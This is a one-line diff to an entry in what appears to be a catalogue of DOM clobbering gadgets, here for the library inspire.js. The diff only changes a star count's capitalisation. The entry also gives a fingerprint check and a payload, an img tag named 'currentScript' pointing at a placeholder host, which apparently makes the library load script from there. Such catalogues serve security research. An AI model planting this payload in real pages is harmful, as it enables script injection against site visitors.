@@ -3,7 +3,7 @@
 ### Meta
 
 + Library: inspire.js
-+ Stars: 1.7k
++ Stars: 1.7K
 + Version: v1.10
 + Fingerprint: `window.hasOwnProperty('inspireLoaded')`
 + Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
